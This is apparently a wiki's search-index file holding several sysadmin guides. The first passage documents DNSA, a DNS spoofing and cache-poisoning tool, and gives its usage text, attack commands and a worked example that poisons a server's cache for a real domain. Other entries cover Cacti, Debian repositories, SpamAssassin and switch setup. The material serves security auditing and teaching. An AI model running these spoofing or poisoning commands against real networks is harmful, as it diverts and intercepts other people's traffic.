“-dev” or “-devel”) to have the header files, help, “man” pages, etc…\nThe libnet-ng - Libnet Next Generation - is available at the following address https://www.security-labs.org/libnetng. Its installation is done via the sources (available tar.gz archives).\nFor a standard installation, the procedure is as follows:\ntar -zxvf ng-libnet-current.tar.gz cd libnet-ng ./configure make make install The “make install” is optional because the path to the libnet-ng directory can be specified as an argument during the installation of DNSA. DNSA requires superuser rights (root) to function, so it is advised to install libnet-ng including the “make install” phase.\nIndeed, it is not possible for a “normal” user to forge packets and send them on an interface of their choice, nor to passively listen to traffic captured by the network interface.\nThe installation of DNSA can begin:\ntar -zxvf dnsa-ng-0.6.tar.gz cd dnsa-ng-0.6 cd sources ./configure Verbosity and debug mode are accessible by compiling DNSA with the options –with-ldflags=-lefence and –enable-debug. It is possible to set the paths to libpcap or libnet-ng with the arguments “–with-libnet=[PATH]” and “–with-libpcap=[PATH]”\nmake make install Files linkDNSA comes with detailed documentation allowing it to be used optimally. docs/ contains articles related to DNS flaws as well as usage examples. sources/ contains all DNSA source codes and the binary after compilation. man/ is currently empty in the latest version\n“Low-Level” Operation linkDNSA can be used in 3 different modes:\n“DNS ID Spoofing” DNSA was originally created to highlight the simplicity of DNS ID Spoofing attacks. This mode is generally used on the same ethernet segment, even if additional attacks can allow very evolved schemes. “DNS ID Sniffing” This mode mainly allows statistical analyses on the distributions of DNS IDs according to the servers or OSes used. Indeed, if the randomness of DNS ID distributions were dependent on older servers, the randomness is now handled by the operating system on which the server runs. An example based on gnuplot, an opensource plotting software, is described in the DNSA documentation. Future evolutions of the software will integrate different statistical tests based on multiple linear regressions. “DNS cache poisoning” This mode is intended for servers vulnerable to these types of attacks. These include notably older Bind, MS Windows, or more recently proprietary firewall appliances. The principle is to respond to the attacked server with forged additional records containing information relating to domains different from the one being queried. Countermeasures to this type of attack are therefore easy to implement. Fortunately, fewer and fewer servers are vulnerable to DNS cache poisoning attacks. The latest version of DNSA supports attacks on wireless networks, through two 802.11 cards. New patches on different drivers (madwifi notably), allow simultaneous listening and injection. The “WiFi” mode allows listening to DNS traffic on the first card, and injecting forged frames thanks to the second. The “ether” mode is the standard mode using pcap filters to select the appropriate content.\nDNSA doesn’t have an event engine. It uses the call-back functions of the lipcap library: the principle is to trigger, when specific packets defined with pcap filters pass, a function containing the payload of the captured packet as well as various other arguments:\nvoid callback_dnsspoof(u_char *args, const struct pcap_pkthdr *pkthdr, const u_char *packet) { (…) } Packets are forged using libnet(-ng) and its predefined constructors for the majority of known protocols.\nUsing DNSA linkDescription of the exploitation, with DNSA, of the attacks presented in part 2 of the “DNS Auditing Tool” file. Examples of exploitation with DNSA are available in Ethernet version and WIFI version.\nGeneral Presentation link Usage: ./dnsa-ng [OPTIONS] DNS Swiss knife tool REQUIRED : -m [mode] where mode can be raw4 or link (depending of your network topology) REQUIRED : -t [media] where media can be 'wifi' or 'ether' * 'wifi' : needs 2 cards as describe in the documentation, needs the -I option to specify the interface which will inject packets * 'ether' : doesn't need further options) -1 DNS ID spoofing [ Required : -S ] -D [www.domain.org] Hostname query to fool. Don't use it if every DNS request sniffed has to be spoofed -S [IP] IP address to send for DNS queries -s [IP] IP address of the host to fool -i [interface] IP address to send for DNS queries -2 DNS IDs Sniffing [ Required : -s ] (Beta and not finished) -s [IP] IP address of the server which makes queries -w [file] Output file for DNS IDs -3 DNS cache poisoning [ Required : -S AND -a AND -b] -a [host.domain.org] Hostname to send in the additional record -b [IP] IP to send in the additional record -D [www.domain.org] Hostname for query. Use it if you want to fool just one -S [IP] IP address to send for DNS queries (the normal one) -s [IP] IP address of the server to fool -i [interface] IP address to send for DNS queries -h Print usage Bug reports to Pierre BETOUIN Usage linkMode “-1” concerns DNS ID Spoofing attacks.\nEthernet Usage link ./dnsa-ng -m [raw4 or link] -1 -D [DOMAIN OR MACHINE NAME] -S IP_TO_SEND -s CLIENT_TO_TRICK -i INTERFACE -t ether The “-S” and “-s” arguments are therefore filters to refine the restrictions of clients to attack. If they are not specified, all DNS queries will be affected.\nWiFi Usage link ./dnsa-ng -m [raw4 or link] -1 -D [DOMAIN OR MACHINE NAME] -S IP_TO_SEND -s CLIENT_TO_TRICK -i ath0 -t wifi -I wlan0 WiFi usage is the same, except for the specification of interfaces. In WiFi mode, one interface captures the raw traffic and another is responsible for injecting traffic. The “-i” interface passively captures traffic while the “-I” interface injects forged packets. Mode “-3” concerns the DNS cache poisoning attacks described above, the generic command for this attack is as follows:\n./dnsa-ng -t ether -m [raw4 or link] -3 -D [HOST SOUGHT] -S [LEGITIMATE IP OF THE HOST] -s [DNS SERVER PERFORMING THE QUERY] -a [ADDRR TO ADD] -b [IP OF THE ADDRR TO ADD] -i [INTERFACE] The following example concerns a query made on the pirate.org domain looking for the hostname “hacker” with IP 100.101.102.103. The DNS server performing the search is server 192.168.1.100. The additional record concerns the FQDN www.microsoft.com by assigning it the IP 1.2.3.4. The injection interface is the eth0 network card.\n./dnsa-ng -t ether -m [raw4 or link] -3 -D hacker.pirate.org -S 100.101.102.103 –s 192.168.1.100 -a www.microsoft.com -b 1.2.3.4 -i eth0 After DNS cache corruption, we can see that the server has cached the forged information:\n$ ping www.microsoft.com PING www.microsoft.com (1.2.3.4): 56 data bytes Conclusion linkDNS is a protocol sensitive to traffic diversion. Its position, traffic, and the ease of exploitation of attacks concerning it make it an essential element whose security level can be audited using DNSA, although countermeasures are not simple to implement.\nDNS is a protocol of choice for malicious users wishing to divert traffic. Its abundant use and the simplicity of possible attacks make it a very sensitive element of the infrastructure.\nDNSA allows auditing the security level of DNS exchanges with an offensive approach as it would be in the case of a real attack.\nHowever, countermeasures are not simple to implement: the most widespread currently being DNSSec which uses asymmetric encryption to guarantee the integrity and authenticity of exchanges.\nDNSA can also be coupled with other tools such as arp-sk to bypass switches (ARP cache poisoning), dsniff, ettercap, etc.\nThe possibilities are multiple. A very realistic scenario was presented at SSTIC 2005 with the total compromise of a classic architecture (DMZ + LAN) from a Web server, to all client workstations of the LAN.\nReferences linkhttps://www.secuobs.com/news/19122007-dnsa.shtml\n"
            }
        );
    index.add(
            {
                id:  701 ,
                href: "\/installation_et_configuration_de_cacti\/",
                title: "Installation and Configuration of Cacti",
                description: "How to install and configure Cacti for network monitoring",
                content: "Introduction linkBefore starting, you should know that the installation of cacti requires a MySQL database, a web server (apache with PHP) and the SNMP protocol.\nCacti is used for specialized network monitoring since the MRTG team abandoned this project to work on Cacti. That said, Cacti doesn’t just monitor networks, you can monitor all types of services.\nInstallation linkBefore installing these programs, enable SNMP on your router. Then, we’ll install cacti and rrdtool:\napt-get install rrdtool cacti In Debian, it will ask you for the name of your MySQL database administrator and password. Then it will ask you for the name of the database that Cacti will use. Choose what you want, then it will ask you to enter a username and password for the cacti user. Your database is ready.\nNow you need to create a symbolic link to put it on the website. We’ll do this using the ln -s command (in case it’s not done automatically):\nln -s /usr/share/cacti/ /var/www/cacti Configuration linkFor Cacti to correctly update the configurations you’re going to enter, you need to enter the crontab of the user who manages your apache server (www-data for debian) and add this line. It will update cacti every 5 minutes:\n*/5 * * * * php /usr/share/cacti/cmd.php \u003e /dev/null 2\u003e\u00261 Launch linkWait a bit for the script to run, then open your browser and type the server address followed by cacti (e.g.: http://127.0.0.1/cacti). It will ask you for a login and password. Enter “admin” for both.\nBy default, you have some services configured. Up to you if you want to configure others… :-)\n"
            }
        );
    index.add(
            {
                id:  702 ,
                href: "\/Cr%C3%A9er_un_repository_Debian\/",
                title: "Creating a Debian Repository",
                description: "This guide explains how to create your own Debian package repository for hosting custom packages.",
                content: "Introduction linkI am a co-designer of the MySecureShell project. The problem is that getting your project accepted in the official Debian/Ubuntu repositories requires significant effort. Therefore, while waiting, we decided to create our own repository. Here, I will describe the steps to create your own repository.\nPreparation linkThis article assumes that the packages to be made available on the repository are already generated. Assuming the package is called “mysecureshell”, you should have the following files:\nmysecureshell.orig.tar.gz mysecureshell.diff.gz mysecureshell.dsc mysecureshell.changes mysecureshell.deb Repository Generation linkGenerating the Structure linkFirst, you need to generate the repository tree structure with the following commands:\nmkdir -p /var/www/mss/debian/dists/testing/main/{binary-i386,source} You need to copy your package files to your repository:\ncp mysecureshell_1.0.dsc mysecureshell_1.0_i386.deb /var/www/mss/debian/dists/testing/main/binary-i386/ cp mysecureshell.diff.gz mysecureshell.dsc mysecureshell.orig.tar.gz mysecureshell.orig.changes /var/www/mss/debian/dists/testing/main/source Generating Repository Files linkThen you need to generate the two files Packages.gz and Sources.gz required for the repository:\ncd /var/www/mss/debian/dists/testing/main dpkg-scanpackages binary-i386 /dev/null dists/testing/main/ | gzip -f9 \u003e binary-i386/Packages.gz dpkg-scansources source /dev/null dists/testing/main/ | gzip -f9 \u003e source/Sources.gz Generating Description Files linkThese two files must be regenerated every time you need to put a new version of your package on the repository.\nFinally, you need to create two description files for your repository. The first file should be placed in the binary-i386 directory, called Release, and should contain:\nArchive: testing Version: 1.0 Component: main Origin: MySecureShell Label: mysecureshell Architecture: i386 The second file should be placed in the source directory, also called Release, and should contain:\nArchive: testing Version: 1.0 Component: main Origin: MySecureShell Label: mysecureshell Architecture: source Your Debian repository is now ready! Now you just need to deploy it on your HTTP server (I’ll let you do that ;-)).\nUsage linkCreating a Debian package repository is fine, but you need to know how to use it.\nUsers who want to use your repository need to add one of the following two lines to their /etc/apt/sources.list file:\ndeb http://mysecureshell.free.fr/debian testing main deb-src http://mysecureshell.free.fr/debian testing main Then the procedure is the same as usual for the package management system to know all the packages available on your repositories:\napt-get update Finally, installing a package from the repository is done with the usual command for all Debian users:\napt-get install mysecureshell References linkhttp://www.debian.org/doc/manuals/repository-howto/repository-howto.fr.html\nhttp://www.debianaddict.org/article31.html\n"
            }
        );
    index.add(
            {
                id:  703 ,
                href: "\/Gmail_:_Avoir_plusieurs_adresses_mails_avec_un_seul_compte_gmail\/",
                title: "Gmail: Having Multiple Email Addresses with a Single Gmail Account",
                description: "How to use a single Gmail account to manage multiple email aliases using the plus sign technique",
                content: "You might want to have multiple email addresses without having multiple accounts. For example, one address for your newsletters, one disposable address, and so on.\nYou can use the “+” sign to accomplish this, for example:\nyouremail@gmail.com: your main address youremail+trash@gmail.com: your disposable address youremail+newsletters@gmail.com: your address for newsletters This gives you multiple addresses, but all emails will arrive in the same inbox. You can then create filtering rules to sort them into specific folders for automated organization.\nHappy emailing! :-)\n"
            }
        );
    index.add(
            {
                id:  704 ,
                href: "\/OpenSSH:_Using_Putty_and_an_HTTP_proxy_to_ssh_anywhere_through_firewalls\/",
                title: "OpenSSH: Using Putty and an HTTP proxy to ssh anywhere through firewalls",
                description: "How to use Putty with an HTTP proxy to access SSH servers through restrictive firewalls",
                content: "Do you ever have the situation (say at work using windows) where you would like to connect to a machine over ssh (say at home using Linux/UNIX) but it’s not possible because of firewall rules? There might be an http-proxy server available that you could use.\nBe aware that applying this trick might be technically possible but not permitted. Probably best to discuss it with someone in your organization first.\nUsing Putty and an HTTP proxy to ssh anywhere through firewalls\n"
            }
        );
    index.add(
            {
                id:  705 ,
                href: "\/OpenSSH:_using_stepstones\/",
                title: "OpenSSH: Using Stepstones",
                description: "Learn how to automate SSH connections using stepstones to save time when connecting through intermediary hosts.",
                content: "You might be working in an environment where you always ssh from your machine to the middle machine and then connect to the destination machine. What a waste of time, let’s see how you could automate it. The middle machine is frequently referred to as stepstone host.\nOpenSSH using stepstones\n"
            }
        );
    index.add(
            {
                id:  706 ,
                href: "\/Le_syst%C3%A8me_de_Packages_OpenBSD\/",
                title: "OpenBSD Package System",
                description: "A guide to understanding and using the OpenBSD package and ports systems for software management.",
                content: "Introduction linkTransitioning to OpenBSD isn’t very straightforward when coming from the Linux world (PS: if you’re coming from Windows, it’s better to stay there or switch to Linux first).\nIn OpenBSD, there are two package systems:\nThe first one is provided by the base OpenBSD system (pkg), containing packages with almost no security vulnerabilities (just a reminder: only 2 vulnerabilities discovered in 10 years). These packages are pre-compiled. The second contains many more software applications (port), but according to OpenBSD, they can compromise system stability and security. That said, it’s still preferable to use these rather than compiling yourself from various sources since these packages have still been validated by the OpenBSD team. These packages are compiled on demand. PGK linkPreparation linkFirst, you need to choose an FTP server to specify the repository. I chose a French server:\nexport PKG_PATH=ftp://ftp.arcane-networks.fr/pub/OpenBSD/`uname -r`/packages/`machine -a`/ To make this permanent, add this line to your .profile file.\nInstalling a package linkTo install packages, there are several arguments available. I use -i for interactive mode (available since OpenBSD 3.9) and the -v option for verbose output. To install postfix, I do:\n$ pkg_add -iv postfix Ambiguous: postfix could be postfix-2.3.2 postfix-2.3.2-ldap postfix-2.3.2-mysql postfix-2.3.2-sasl2 postfix-2.4.20060727 postfix-2.4.20060727-ldap postfix-2.4.20060727-mysql postfix-2.4.20060727-sasl2 Choose one package 0: 1: postfix-2.3.2 2: postfix-2.3.2-ldap 3: postfix-2.3.2-mysql 4: postfix-2.3.2-sasl2 5: postfix-2.4.20060727 6: postfix-2.4.20060727-ldap 7: postfix-2.4.20060727-mysql 8: postfix-2.4.20060727-sasl2 Your choice: I can then choose the version number I want to install. Otherwise, I can directly specify what I want:\npkg_add -v postfix-2.4.20060727 Getting information linkTo get information about my installed packages, I can use:\n$ pkg_info screen-4.0.3 multi-screen window manager tcl-8.4.7p1 Tool Command Language vim-7.0.42-no_x11 vi clone, many additional features zsh-4.2.6p0 Z shell, Bourne shell-compatible Updating packages linkTo update packages, just use the pkg_add command with an argument and the name of the package to update:\npkg_add -u screen If you add the -c option, it will overwrite the current configuration files with the default ones.\nRemoving a package linkAgain, it’s not very complicated, use the pkg_delete command followed by the package to remove:\npkg_delete screen Upgrade linkWhen there’s a version upgrade, remember to modify your repository line, then do this to update all packages:\npkg_add -ui -F update -F updatedepends Port linkGetting the ports tree linkLet’s get the tar.gz and decompress it:\ncd /tmp ftp ftp://ftp.openbsd.org/pub/OpenBSD/`uname -r`/ports.tar.gz cd /usr tar xzf /tmp/ports.tar.gz Configuring the ports system linkIf you’ve created a new user, add them to the sudoers list, and give them the rights:\nchgrp -R wsrc /usr/ports find /usr/ports -type d -exec chmod g+w {} \\; Next, let’s add a few lines to the mk.conf file:\necho \"USE_SYSTRACE=Yes\" \u003e\u003e /etc/mk.conf echo \"WRKOBJDIR=/usr/obj/ports\" \u003e\u003e /etc/mk.conf echo \"DISTDIR=/usr/distfiles\" \u003e\u003e /etc/mk.conf echo \"PACKAGE_REPOSITORY=/usr/packages\" \u003e\u003e /etc/mk.conf Searching for packages linkTo perform a search:\ncd /usr/ports make search key=nmap Port: nmap-4.11 Path: net/nmap Info: scan ports and fingerprint stack of network hosts Maint: Okan Demirmen Index: net security L-deps: dnet::net/libdnet gdk_pixbuf-2.0.0.0,gdk-x11-2.0.0.0,gtk-x11-2.0.0.0::x11/gtk+2 iconv.\u003e=4::converters/libiconv intl.\u003e=3:gettext-\u003e=0.10.38:devel/gettext pcre::devel/pcre B-deps: :devel/gmake gettext-\u003e=0.14.5:devel/gettext pkgconfig-*:devel/pkgconfig R-deps: gettext-\u003e=0.10.38:devel/gettext Archs: any Port: nmap-4.11-no_x11 Path: net/nmap,no_x11 Info: scan ports and fingerprint stack of network hosts Maint: Okan Demirmen Index: net security L-deps: dnet::net/libdnet pcre::devel/pcre B-deps: :devel/gmake R-deps: Archs: any Here I don’t have a graphical interface, so I don’t need X11, the no_x11 option is interesting to me.\nInstalling a package linkTo install a package, just go to the right section and start the compilation:\ncd /usr/ports/net/nmap/ Now let’s see the available options:\n$ make show=FLAVORS no_x11 Once again, we can see that I can compile nmap without the graphical interface. I pass my argument before compiling, then run make install:\nenv FLAVOR=\"no_x11\" make install Cleaning up after compilation linkYou probably want to clean up the default working directory of the port after building and installing the package.\n$ make clean ===\u003e Cleaning for rsnapshot-1.2.9 You can also clean the working directories of all the port’s dependencies with this make target:\n$ make clean=depends ===\u003e Cleaning for rsync-2.6.8 ===\u003e Cleaning for rsnapshot-1.2.9 If you want to remove all the port’s distribution sources, you can use:\n$ make clean=dist ===\u003e Cleaning for rsnapshot-1.2.9 ===\u003e Dist cleaning for rsnapshot-1.2.9 In case you’ve compiled multiple flavors of the same port, you can clean the working directories of all these flavors at once using:\n$ make clean=flavors "
            }
        );
    index.add(
            {
                id:  707 ,
                href: "\/Migration_:_Migrer_des_comptes_linux_vers_BSD\/",
                title: "Migration: Migrating Linux accounts to BSD",
                description: "Guide for migrating user accounts from Linux systems to BSD systems while maintaining account details and passwords.",
                content: "Introduction linkHere is a solution that allows you to easily migrate Linux accounts to BSD. The only constraint is that you must not have two identical logins or identifiers after this migration.\nLinux linkCommands to execute (as root) on your Linux machine for exporting:\nGathering data from /etc/passwd and /etc/shadow files: pwunconv Transforming the /etc/passwd file to be usable by BSD systems (grep -v ‘root|daemon’ excludes root and daemon users): cat /etc/passwd | grep -v '^root\\|^daemon' | awk -F: '{printf(\"%s:%s:%s:%s::0:0:%s:%s:%s\\n\", $1,$2,$3,$4,$5,$6,$7);}' \u003e ~/linux_passwd Separate the data from /etc/passwd and /etc/shadow again: pwconv BSD linkRetrieve the generated file on your BSD system, then for importing:\nAdd the content of the linux_passwd file to the end of /etc/master.passwd: cat linux_passwd \u003e\u003e /etc/master.passwd Regenerate the /etc/pwd.db and /etc/spwd.db files: pwd_mkdb -p /etc/master.passwd "
            }
        );
    index.add(
            {
                id:  708 ,
                href: "\/Fluxbox_:_Arrondir_les_bords_de_toutes_les_fen%C3%AAtres\/",
                title: "Fluxbox: Rounded Corners for All Windows",
                description: "How to add rounded corners to all windows in Fluxbox window manager",
                content: "Edit /usr/share/fluxbox/styles/current_theme_name, and insert these lines:\nmenu.roundCorners: topleft topright bottomleft bottomright window.roundCorners: topleft topright bottomleft bottomrondie toolbar.roundCorners: topleft topright bottomleft bottomrondie Resources linkGet familiar with alternative Linux desktops\n"
            }
        );
    index.add(
            {
                id:  709 ,
                href: "\/Lutter_un_peu_plus_contre_le_SPAM_-_R%C3%A8gles_suppl%C3%A9mentaires\/",
                title: "Fight Spam More Effectively - Additional Rules",
                description: "A guide on how to enhance spam filtering with additional rules and tools like Razor and Pyzor.",
                content: "Installation linkInstall Razor, Pyzor and Configure SpamAssassin.\nRazor and Pyzor are spamfilters that use a collaborative filtering network. To install them, run:\napt-get install razor pyzor Configuration linkNow we have to tell SpamAssassin to use these programs. Edit /etc/spamassassin/local.cf so that it looks like this:\n# SpamAssassin Configuration rewrite_header Subject *****SPAM***** use_bayes 1 bayes_auto_learn 1 required_score 5.0 skip_rbl_checks 0 report_safe 0 #pyzor use_pyzor 1 pyzor_path /usr/bin/pyzor #razor use_razor2 1 razor_config /etc/razor/razor-agent.conf ok_locales en fr whitelist_from *@deimos.fr noreply@lists.silicon.fr blacklist_from *@mandrivaclub.com Note: Here is an automatic SpamAssasin Configuration Generator.\nThen, run:\n/etc/init.d/amavis restart Custom Rules linkNow I want to insert some custom rulesets that can be found on the internet into SpamAssassin. I have tested those rulesets, and they make spam filtering a lot more effective.\nCreate the file /usr/local/sbin/sa_rules_update.sh:\n#!/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin cd /etc/spamassassin/ \u0026\u003e /dev/null \u0026\u0026 /usr/bin/wget http://www.rulesemporium.com/rules/71_sare_redirect_pre3.0.0.cf -O 71_sare_redirect_pre3.0.0.cf \u0026\u003e /dev/null cd /etc/spamassassin/ \u0026\u003e /dev/null \u0026\u0026 /usr/bin/wget http://www.rulesemporium.com/rules/70_sare_bayes_poison_nxm.cf -O 70_sare_bayes_poison_nxm.cf \u0026\u003e /dev/null cd /etc/spamassassin/ \u0026\u003e /dev/null \u0026\u0026 /usr/bin/wget http://www.rulesemporium.com/rules/70_sare_html.cf -O 70_sare_html.cf \u0026\u003e /dev/null cd /etc/spamassassin/ \u0026\u003e /dev/null \u0026\u0026 /usr/bin/wget http://www.rulesemporium.com/rules/70_sare_html4.cf -O 70_sare_html4.cf \u0026\u003e /dev/null cd /etc/spamassassin/ \u0026\u003e /dev/null \u0026\u0026 /usr/bin/wget http://www.rulesemporium.com/rules/70_sare_html_x30.cf -O 70_sare_html_x30.cf \u0026\u003e /dev/null cd /etc/spamassassin/ \u0026\u003e /dev/null \u0026\u0026 /usr/bin/wget http://www.rulesemporium.com/rules/70_sare_header0.cf -O 70_sare_header0.cf \u0026\u003e /dev/null cd /etc/spamassassin/ \u0026\u003e /dev/null \u0026\u0026 /usr/bin/wget http://www.rulesemporium.com/rules/70_sare_header3.cf -O 70_sare_header3.cf \u0026\u003e /dev/null cd /etc/spamassassin/ \u0026\u003e /dev/null \u0026\u0026 /usr/bin/wget http://www.rulesemporium.com/rules/70_sare_header_x30.cf -O 70_sare_header_x30.cf \u0026\u003e /dev/null cd /etc/spamassassin/ \u0026\u003e /dev/null \u0026\u0026 /usr/bin/wget http://www.rulesemporium.com/rules/70_sare_specific.cf -O 70_sare_specific.cf \u0026\u003e /dev/null cd /etc/spamassassin/ \u0026\u003e /dev/null \u0026\u0026 /usr/bin/wget http://www.rulesemporium.com/rules/70_sare_adult.cf -O 70_sare_adult.cf \u0026\u003e /dev/null cd /etc/spamassassin/ \u0026\u003e /dev/null \u0026\u0026 /usr/bin/wget http://www.rulesemporium.com/rules/72_sare_bml_post25x.cf -O 72_sare_bml_post25x.cf \u0026\u003e /dev/null cd /etc/spamassassin/ \u0026\u003e /dev/null \u0026\u0026 /usr/bin/wget http://www.rulesemporium.com/rules/99_sare_fraud_post25x.cf -O 99_sare_fraud_post25x.cf \u0026\u003e /dev/null cd /etc/spamassassin/ \u0026\u003e /dev/null \u0026\u0026 /usr/bin/wget http://www.rulesemporium.com/rules/70_sare_spoof.cf -O 70_sare_spoof.cf \u0026\u003e /dev/null cd /etc/spamassassin/ \u0026\u003e /dev/null \u0026\u0026 /usr/bin/wget http://www.rulesemporium.com/rules/70_sare_random.cf -O 70_sare_random.cf \u0026\u003e /dev/null cd /etc/spamassassin/ \u0026\u003e /dev/null \u0026\u0026 /usr/bin/wget http://www.rulesemporium.com/rules/70_sare_oem.cf -O 70_sare_oem.cf \u0026\u003e /dev/null cd /etc/spamassassin/ \u0026\u003e /dev/null \u0026\u0026 /usr/bin/wget http://www.rulesemporium.com/rules/70_sare_genlsubj0.cf -O 70_sare_genlsubj0.cf \u0026\u003e /dev/null cd /etc/spamassassin/ \u0026\u003e /dev/null \u0026\u0026 /usr/bin/wget http://www.rulesemporium.com/rules/70_sare_genlsubj3.cf -O 70_sare_genlsubj3.cf \u0026\u003e /dev/null cd /etc/spamassassin/ \u0026\u003e /dev/null \u0026\u0026 /usr/bin/wget http://www.rulesemporium.com/rules/70_sare_genlsubj_x30.cf -O 70_sare_genlsubj_x30.cf \u0026\u003e /dev/null cd /etc/spamassassin/ \u0026\u003e /dev/null \u0026\u0026 /usr/bin/wget http://www.rulesemporium.com/rules/70_sare_unsub.cf -O 70_sare_unsub.cf \u0026\u003e /dev/null cd /etc/spamassassin/ \u0026\u003e /dev/null \u0026\u0026 /usr/bin/wget http://www.rulesemporium.com/rules/70_sare_uri.cf -O 70_sare_uri.cf \u0026\u003e /dev/null cd /etc/spamassassin/ \u0026\u003e /dev/null \u0026\u0026 /usr/bin/wget http://www.timj.co.uk/linux/bogus-virus-warnings.cf -O bogus-virus-warnings.cf \u0026\u003e /dev/null cd /etc/spamassassin/ \u0026\u003e /dev/null \u0026\u0026 /usr/bin/wget http://www.yackley.org/sa-rules/evilnumbers.cf -O evilnumbers.cf \u0026\u003e /dev/null cd /etc/spamassassin/ \u0026\u003e /dev/null \u0026\u0026 /usr/bin/wget http://www.stearns.org/sa-blacklist/random.current.cf -O random.current.cf \u0026\u003e /dev/null cd /etc/spamassassin/ \u0026\u003e /dev/null \u0026\u0026 /usr/bin/wget http://www.rulesemporium.com/rules/88_FVGT_body.cf -O 88_FVGT_body.cf \u0026\u003e /dev/null cd /etc/spamassassin/ \u0026\u003e /dev/null \u0026\u0026 /usr/bin/wget http://www.rulesemporium.com/rules/88_FVGT_rawbody.cf -O 88_FVGT_rawbody.cf \u0026\u003e /dev/null cd /etc/spamassassin/ \u0026\u003e /dev/null \u0026\u0026 /usr/bin/wget http://www.rulesemporium.com/rules/88_FVGT_subject.cf -O 88_FVGT_subject.cf \u0026\u003e /dev/null cd /etc/spamassassin/ \u0026\u003e /dev/null \u0026\u0026 /usr/bin/wget http://www.rulesemporium.com/rules/88_FVGT_headers.cf -O 88_FVGT_headers.cf \u0026\u003e /dev/null cd /etc/spamassassin/ \u0026\u003e /dev/null \u0026\u0026 /usr/bin/wget http://www.rulesemporium.com/rules/88_FVGT_uri.cf -O 88_FVGT_uri.cf \u0026\u003e /dev/null cd /etc/spamassassin/ \u0026\u003e /dev/null \u0026\u0026 /usr/bin/wget http://www.rulesemporium.com/rules/99_FVGT_DomainDigits.cf -O 99_FVGT_DomainDigits.cf \u0026\u003e /dev/null cd /etc/spamassassin/ \u0026\u003e /dev/null \u0026\u0026 /usr/bin/wget http://www.rulesemporium.com/rules/99_FVGT_Tripwire.cf -O 99_FVGT_Tripwire.cf \u0026\u003e /dev/null cd /etc/spamassassin/ \u0026\u003e /dev/null \u0026\u0026 /usr/bin/wget http://www.rulesemporium.com/rules/99_FVGT_meta.cf -O 99_FVGT_meta.cf \u0026\u003e /dev/null cd /etc/spamassassin/ \u0026\u003e /dev/null \u0026\u0026 /usr/bin/wget http://www.nospamtoday.com/download/mime_validate.cf -O mime_validate.cf \u0026\u003e /dev/null /etc/init.d/amavis restart \u0026\u003e /dev/null exit 0 Now you have to set the executable permissions:\nchmod 744 /usr/local/sbin/sa_rules_update.sh Then, add it to Crontab:\n0 1 * * * /usr/local/sbin/sa_rules_update.sh \u0026\u003e /dev/null Resources linkAdding And Updating SpamAssassin Rulesets With RulesDuJour\n"
            }
        );
    index.add(
            {
                id:  710 ,
                href: "\/Configuration_d\u0027un_Switch_Catalyst\/",
                title: "Configuring a Catalyst Switch",
                description: "Learn how to configure and manage Cisco Catalyst switches through console, firmware updates, VLAN setup, and more.",
                content: "Connections linkStart by connecting the serial port on the PC side and the console port on the switch.\nConnection linkLaunch HyperTerminal and choose a connection on com1 port, or another com port depending on the PC configuration. You need to choose 9600 Bauds The rest doesn’t matter much…\nWhat You Need to Know linkWhen launching the terminal, you’ll determine several things:\nThe router name (for example: swpar5) A secret A password A virtual terminal password Then you need to switch to “enable” mode to be able to change the configuration\nenable The prompt changes from swpar5\u003e to swpar5#\nIn this mode, you can view the router configuration by typing\nsh run Resources linkCisco Basic Concepts\nIf you want to modify this configuration, you need to switch to “conf” mode\nconf t Result: the prompt changes to swpar5(config)#\nThe “t” is to indicate that you want to configure the router in terminal mode.\nConfiguring the IP Address of an Interface linkBy running sh run, you can see the different interfaces, like this:\ninterface FastEthernet0/24 ! interface GigabitEthernet0/1 ! interface GigabitEthernet0/2 ! interface Vlan1 no ip address no ip route-cache ! ip http server ! control-plane ! ! line con 0 line vty 0 4 password *xxxxx* no login line vty 5 15 Here we see an interface named Vlan1 that has no IP address, and we notice that the two lines that follow are indented with a space, so we can modify them by typing, in “configuration” mode:\ninterface Vlan1 The prompt then changes to swpar5(config-if)# Then type\nip address 192.168.0.169 255.255.255.0 Then return to enable mode (with the prompt swpar5#) and type:\nwr m to save\nFrom there, you can access the router’s web interface by typing\nhttp://192.168.0.169 Firmware Update linkChecking Firmware Version linkType\nsh ver Downloading the Latest Version linkGo to cisco.fr –\u003e support –\u003e download software –\u003e software advisor –\u003e Find software compatible with my hardware –\u003e Select your hardware configuration manually –\u003e then choose the router model and download the archive. You have the choice between software that supports CRYPTO (secure https connection) or not.\nInstalling the New Firmware linkIt’s a .tar archive that needs to be loaded from the router’s web interface. Everything is automatic.\nConfiguring the VTP Domain link swpar5(config)#vtp mode client (or server or transparent) swpar5(config)#vtp domain ulnet-fr http://www.cisco.com/en/US/docs/switches/lan/catalyst4500/12.1/12ew/configuration/guide/vtp.html#wp1032093\nConfiguring an Interface linkSetting trunk mode allows multiple VLANs to pass through a single port between multiple switches:\nswpar5(config-if)#switchport mode trunk swpar5(config-if)#switchport nonegotiate swpar5(config-if)#auto qos voip trust swpar5(config-if)#macro description cisco-switch swpar5(config-if)#spanning-tree link-type point-to-point Creating a VLAN linkSwitch to configuration mode, and type\nswpar5(config)#vlan x where “x” is an “id” for the VLAN (a number), then choose a name for this VLAN. To do this, in conf mode, type “vlan x”\nswpar5(config-vlan)#name vlan_name You can verify the VLAN configuration with the command\nswpar5#sh vlan Once the VLAN is created, it’s better to put it in “no-shutdown” so that it doesn’t automatically deactivate:\nswpar5(config-if)#no shutdown http://www.cisco.com/en/US/docs/switches/lan/catalyst2960/software/release/12.2_25_fx/configuration/guide/swvlan.html#wp1273595\nAssigning an Interface to a VLAN linkEnter configuration mode and choose an interface, for example “interface FastEthernet0/1”, and type\nswpar5(config-if)#switchport mode access swpar5(config-if)#switchport access vlan 3 (if the VLAN is called \"vlan 3\") Graphical Mode linkOnce you have assigned an IP address, you can access the switch’s graphical interface via http. When asked for a username and password, you only need to enter the password that you set at the beginning.\nResources linkCisco Basic Concepts\n"
            }
        );
    index.add(
            {
                id:  711 ,
                href: "\/Renforcement_des_fonctions_de_s%C3%A9curit%C3%A9_du_noyau_Linux\/",
                title: "Strengthening Linux Kernel Security Functions",
                description: "An overview of various security mechanisms for Linux kernels to ensure system integrity protection, including Address Space Layout Randomization, GrSecurity, PaX, SELinux, and network security.",
